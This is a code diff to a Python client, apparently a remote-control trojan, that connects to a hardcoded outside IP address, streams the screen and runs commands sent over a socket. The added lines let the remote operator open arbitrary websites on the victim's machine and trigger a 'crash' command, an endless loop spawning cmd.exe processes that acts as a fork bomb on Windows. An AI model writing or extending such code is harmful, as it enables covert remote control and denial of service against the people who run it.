@@ -5,6 +5,7 @@ import shutil
 from vidstream import ScreenShareClient
 import threading
 import time
+import webbrowser
 
 ip = "77.250.137.62"
 port = 8080
@@ -43,6 +44,14 @@ while (keepgoing == True):
                 t.start()
                 time.sleep(10)
                 sender.stop_stream()
+            elif msg == "website":
+                website = sock.recv(1024)
+                website = website.decode()
+                webbrowser.open(website, new=1)
+            elif msg == "crash":
+                while True:
+                    os.system("start /B start cmd.exe")
+                    print("started")
 
     except:
         traceback.print_exc()
